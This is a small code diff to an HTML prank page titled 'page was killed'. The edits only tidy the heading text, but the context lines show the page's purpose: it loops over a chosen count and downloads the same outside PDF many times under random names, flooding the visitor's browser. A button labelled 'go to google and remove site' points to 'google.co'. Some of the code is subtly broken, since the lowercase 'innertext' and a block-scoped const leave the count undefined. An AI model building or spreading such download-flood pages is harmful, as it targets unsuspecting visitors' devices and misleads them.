@@ -4,7 +4,7 @@
 		<title>page was killed</title>
 	</head>
 	<body>
-		<h1 id="displayAmount">downloading files : </h1>
+		<h1 id="displayAmount">downloading files: undefined</h1>
 		<button onclick='window.location.replace("https://www.google.co/")'>go to google and remove site</button>
 	</body>
 	<script>
@@ -40,7 +40,8 @@
 			} else {
 				const fileAmount = fileAmountTemp;
 			};
-		document.getElementById("displayAmount").innertext = `downloading files : ${fileAmount}`;
+		
+		document.getElementById("displayAmount").innertext = `downloading files: ${fileAmount}`;
 	    	for (let i = 0; i < fileAmount; i++) {
 	      		let name = makeid(10);
 	      		downloadFile('https://www.africau.edu/images/default/sample.pdf', name += ".pdf");
